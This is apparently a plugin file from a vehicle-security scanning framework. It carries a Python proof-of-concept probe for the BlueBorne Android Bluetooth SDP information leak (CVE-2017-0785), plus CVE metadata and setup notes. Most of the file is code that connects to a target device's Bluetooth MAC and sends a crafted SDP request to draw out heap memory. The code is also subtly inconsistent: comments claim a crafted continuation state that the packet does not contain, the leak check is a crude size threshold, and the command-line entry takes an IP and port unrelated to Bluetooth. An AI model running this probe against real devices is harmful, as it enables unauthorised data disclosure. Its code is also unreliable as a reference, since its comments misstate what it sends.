#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    info = {"adapter_found": False, "hcitool_available": False}
    try:
        r = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            if line.strip().startswith("hci"):
                info["adapter_found"] = True
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _send_blueborne_sdp_probe(mac: str) -> dict:
    """
    CVE-2017-0785: Android SDP information leak (BlueBorne).
    Send crafted SDP request to read memory from Android BT stack heap.
    The vulnerability lies in SDP server returning data from uninitialized heap buffer.
    """
    result = {"connected": False, "sdp_response": "", "error": "", "info_leaked": False}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(8.0)
        bdaddr_bytes = bytes(int(b, 16) for b in reversed(mac.split(":")))
        addr = struct.pack("<H H 6s H B", AF_BLUETOOTH, 0x0001, bdaddr_bytes, 0, 0)
        sock.connect(addr)
        result["connected"] = True

        # BlueBorne SDP info leak: ServiceBrowseResponse with crafted AttributeCount
        # causing Android BT stack to return heap memory
        # SDP ServiceSearchAttributeRequest with MaxAttributeByteCount=1024 and
        # ContinuationState set to trigger second response with heap leak
        uuid_seq = b'\x35\x03\x19\x01\x00'  # Browse group UUID
        max_bytes = struct.pack(">H", 1024)
        attr_list = b'\x35\x05\x0A\x00\x00\xFF\xFF'
        cont_state = b'\x00'  # No continuation

        pdu_body = uuid_seq + max_bytes + attr_list + cont_state
        pdu = struct.pack(">B H H", 0x06, 0x0002, len(pdu_body)) + pdu_body
        sock.sendall(pdu)

        try:
            resp = sock.recv(4096)
            result["sdp_response"] = resp.hex()
            # Check if response is larger than expected (heap data leaked)
            if len(resp) > 64:
                result["info_leaked"] = True
                result["response_size"] = len(resp)
        except socket.timeout:
            result["sdp_response"] = "timeout"

        sock.close()
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")
    wireless_scan_text = params.get("wireless_scan_text", "")

    evidence = {
        "cve": "CVE-2017-0785",
        "target": bt_mac or "Android device BT (BlueBorne SDP info leak)",
        "technique": (
            "BlueBorne SDP heap info leak: send crafted SDP ServiceSearchAttributeRequest "
            "with ContinuationState to trigger Android BT heap data disclosure"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-0785",
        "affected_versions": "Android < 2017-09-01 security patch (all Android with BT enabled)",
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    if not adapter_info["adapter_found"]:
        evidence["note"] = "No BT adapter available for BlueBorne SDP probe"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if not bt_mac:
        evidence["note"] = "bluetooth_mac parameter required for BlueBorne SDP probe"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    sdp_result = _send_blueborne_sdp_probe(bt_mac)
    evidence["sdp_probe"] = sdp_result

    if sdp_result.get("info_leaked"):
        vulnerable = True
        evidence["note"] = (
            f"SDP response larger than expected ({sdp_result.get('response_size')} bytes); "
            "possible heap data disclosure - CVE-2017-0785 BlueBorne SDP info leak"
        )
    elif sdp_result["connected"]:
        vulnerable = None
        evidence["note"] = "SDP connected; analyze response content for heap data patterns"
    else:
        vulnerable = None
        evidence["note"] = f"BT connection failed: {sdp_result.get('error')}"

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


VULN = {
    "id": 66,
    "cve": "CVE-2017-0785",
    "year": 2017,
    "domain": "蓝牙/移动-车机互联",
    "vendor_product": "Android Bluetooth",
    "component": "Bluetooth SDP",
    "type": "BlueBorne信息泄露",
    "summary": "BlueBorne蓝牙SDP信息泄露，可辅助攻击链。",
    "source_description": "A information disclosure vulnerability in the Android system (bluetooth). Product: Android. Versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0. Android ID: A-63146698.",
    "poc_status": "有公开PoC/研究代码",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-0785",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-0785",
        "http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html",
        "http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html",
        "https://source.android.com/security/bulletin/2017-09-01",
        "http://www.securitytracker.com/id/1041300",
        "http://www.securityfocus.com/bid/100812",
        "https://cveawg.mitre.org/api/cve/CVE-2017-0785"
    ],
    "affected": [
        {
            "vendor": "Google Inc.",
            "product": "Android",
            "versions": [
                {
                    "version": "4.4.4",
                    "status": "affected"
                }
,
                {
                    "version": "5.0.2",
                    "status": "affected"
                },
                {
                    "version": "5.1.1",
                    "status": "affected"
                },
                {
                    "version": "6.0",
                    "status": "affected"
                },
                {
                    "version": "6.0.1",
                    "status": "affected"
                },
                {
                    "version": "7.0",
                    "status": "affected"
                },
                {
                    "version": "7.1.1",
                    "status": "affected"
                },
                {
                    "version": "7.1.2",
                    "status": "affected"
                },
                {
                    "version": "8.0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2017-0785",
        "Android",
        "Bluetooth",
        "SDP",
        "BlueBorne",
        "information",
        "disclosure",
        "vulnerability",
        "system",
        "bluetooth",
        "A-63146698",
        "Google Inc"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（CSR8510 / Qualcomm QCA9377）', '或内置 BlueZ 5.x 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）',
    "tools":      ['BlueZ ≥ 5.48', 'hcitool', 'l2ping'],
    "firmware":   'N/A（通过 BlueZ 内核模块直接操作）',
    "setup":      'hciconfig hci0 up && hcitool scan',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc51CVE20170785BlueBorneAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-051"
    meta_poc_name = 'CVE-2017-0785 BlueBorne信息泄露 Active Validation'
    meta_cve_id = 'CVE-2017-0785'
    meta_severity = 'Medium'
    meta_protocol = 'bluetooth'
    meta_target_os = ['android']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2017-0785'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2017-0785']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "51_Android_BT_SDP_BlueBorne_Info_Leak_Audit") if "VULN" in dir() else "51_Android_BT_SDP_BlueBorne_Info_Leak_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc51CVE20170785BlueBorneAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
